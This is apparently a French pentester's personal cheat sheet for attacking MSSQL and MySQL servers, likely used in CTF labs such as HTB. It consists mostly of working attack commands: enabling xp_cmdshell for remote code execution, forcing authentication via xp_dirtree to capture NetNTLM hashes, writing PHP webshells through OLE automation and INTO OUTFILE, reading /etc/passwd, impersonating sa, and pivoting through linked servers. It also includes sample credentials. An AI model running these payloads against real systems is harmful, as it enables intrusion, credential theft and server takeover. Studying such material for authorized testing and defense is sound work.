
- [ ] [[#1. BRUTEFORCE]]
- [ ] [[#2. interagir avec la DB]]
- [ ] [[#3. RCE]]



---
# 1. BRUTEFORCE 

[[Bruteforce en ligne#MSSQL]]


---

# 2. interagir avec la DB

- [[#WINDOWS]]
- [[#LINUX]]

## WINDOWS

### MSSQL

```cmd
sqlcmd -S 10.129.20.13 -U username -P Password123
```

### MySQL

```cmd
mysql.exe -u username -p"Password123" -h 10.129.20.13
```

```cmd
mysql.exe -u username -p"Password123" -h 10.129.20.13 -e "commande à executer"
```

[[Commandes SQL#MY SQL / MARIADB]]


## LINUX

### MSSQL

```shell
sqsh -S 10.129.20.13 -U username -P Password123
```

utiliser l'authent windows
```shell
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

utiliser Impacket si sqsh ne fonctionne pas -> [[Commandes SQL#Client Impacket-mssqlclient]]
#### Identifier les db

```sql
SELECT name FROM master.dbo.sysdatabases
```

#### Switch sur une db

```sql
USE flagDB
```

#### Afficher les tables de la db

```sql
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
```

#### Afficher les données de la table

```sql
SELECT * FROM tb_flag
```

### MySQL

[[Commandes SQL#MY SQL / MARIADB]]


### GUI avec DBEAVER

https://github.com/dbeaver/dbeaver/releases

```shell-session
sudo dpkg -i dbeaver-<version>.deb
```


---
# 3. RCE

## MSSQL

A tester :

- [ ] [[#XP_CMDSHELL (Extended Stored Procedures)]]
- [ ] [[#XP_DIRTREE / XP_SUBDIRS]]
- [ ] [[#Ole Automation Procedures]]
- [ ] [[#Lecture de fichiers]]
- [ ] [[#User Impersonation]]
- [ ] [[#Latéraliser vers une autre DB]]


[[#Impacket-mssql CheatSheet]]



### **XP_CMDSHELL (Extended Stored Procedures)**

Permet d'exécuter des commandes systèmes

##### Depuis la db

1. Verifier si xp_cmdshell est activé

```
SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'
```

2. Si actif exécuter commande

```cmd
xp_cmdshell 'whoami'
go
```

##### En remote

```bash
nxc mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
```

##### Si xp_cmdshell n'est pas activé, possible de l'activer si privilèges appropriés

depuis la db
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
go

-- To update the currently configured value for advanced options.  
RECONFIGURE
go  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
go  

-- To update the currently configured value for this feature.  
RECONFIGURE
go
```



### **XP_DIRTREE / XP_SUBDIRS**

> [!Tip]
> Permet de faire une coercition d'authentification vers une autre machine.
> Utile pour capturer challenge-response NetNTLM ou récupérer ticket kerberos depuis une machine en délégation non restreinte (penser à utiliser le FQDN afin d'utiliser l'authent kerberos).

1. Lancer responder ou impacket-smbserver [[LLMNR, NBT-NS Poisoning & SMB Relay - T1557.001#RESPONDER]]
2. XP_DIRTREE

```cmd-session
EXEC master..xp_dirtree '\\10.10.110.17\share\'
go
```
 
 ou XP_SUBDIRS
 
```cmd-session
EXEC master..xp_subdirs '\\10.10.110.17\share\'
go
```

3. Puis relais smb ou crack du hash / Capture du ticket kerberos avec Rubeus en mode monitor en parrallel.




### **Ole Automation Procedures**

Object Linking and Embedding (OLE) -> Permet de créer et lier des objets permettant la création de fichier, exécution de commandes etc..

> [!Warning]
> Ne permet pas de retourner la sortie. Utile pour exécuter des powershell one liner ou écrire des fichiers par exemple.

https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option

Vérifier si Ole Automation Procedures est activé

```
SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'
```

Activer Ole Automation Procedures

```mssql
sp_configure 'show advanced options', 1
go
RECONFIGURE
go
sp_configure 'Ole Automation Procedures', 1
go
RECONFIGURE
go
```

Créer un fichier

```mssql
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
go
```

Lancer un processus / Exécuter une commande

```
DECLARE @output INT
DECLARE @ProgramToRun VARCHAR(255)
SET @ProgramToRun = 'Run("calc.exe")'
EXEC sp_oacreate 'wScript.Shell', @output out
EXEC sp_oamethod @output, @ProgramToRun
EXEC sp_oadestroy @output
```


### **Lecture de fichiers**

OPENROWSET(BULK)

> [!Tip]
> Fonction interne de MSSQL qui utilise directement le token de la session en cours et non pas celui du processus mssqlsvc (utile dans le cas d'usurpation d'un utilisateurs administrateur de la machine par exemple.)

```cmd-session
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
go
```



### **User Impersonation**

Identifier les users dont l'usurpation est possible

```cmd-session
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
go
```

Impersonation du user sa (depuis la masterdb)

```cmd-session
EXECUTE AS LOGIN = 'sa';
go
SELECT SYSTEM_USER;
go
SELECT IS_SRVROLEMEMBER('sysadmin');
go
```

Possible maintenant d'exécuter des commandes en admin de la db




### **Latéraliser vers une autre DB**

https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver16

Linked servers -> permet de faire une requête vers une autre base de données.

Identifier les serveurs liés

```cmd
SELECT srvname, isremote FROM sysservers
go
```

si isremote = 0 alors linked server

Identifier le user utilisé pour la connexion et ses privilèges avec EXECUTE qui permet d'envoyer la requête à exécuter en remote. (possible d'enchainer les requêtes avec ; )

```cmd-session
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
go
```



### **Impacket-mssql CheatSheet**

```sh
# Authentification classique / Windows
impacket-mssqlclient DOMAIN/user:'password'@hostname
impacket-mssqlclient DOMAIN/user:'password'@hostname -windows-auth


# Enumérer db / owners
enum_db
enum_owner


# Enumérer users / logins
enum_users
enum_logins


# Tester user impersonation
enum_impersonate
exec_as_user
exec_as_login


# Tester XP_DIRTREE (NTLM et Kerberos)
xp_dirtree \\10.10.16.60\share
xp_dirtree \\hostname.domain\c$


# Tester XP_CMDSHELL (RCE)
xp_cmdshell whoami
enable_xp_cmdshell
disable_xp_cmdshell

# Tester sp_start_job (RCE)
sp_start_job whoami


# Tester Linked Servers
enum_links
use_link "hostname"
```

Automatiser l'énumération avec un fichier contenant les commandes

```sh
impacket-mssqlclient DARKZERO/john.w:'RFulUtONCOL!'@darkzero.htb -windows-auth -file enum_sql
```




---
## MYSQL / MARIADB

### RCE

```
system <command>
```

### SHELL local

```
\! /bin/sh
```


### File Privilege

Afficher FILE privilege (si valeur vide alors privilège !)

```shell
show variables like "secure_file_priv";
```

### Ecrire fichier en local (upload d'un webshell)

```shell
SELECT "<?php echo shell_exec($_REQUEST['cmd']);?>" INTO OUTFILE ' C:/xampp/htdocs/xampp/webshell.php';
```

### Lire fichier en local

```shell-session
select LOAD_FILE("/etc/passwd");
```
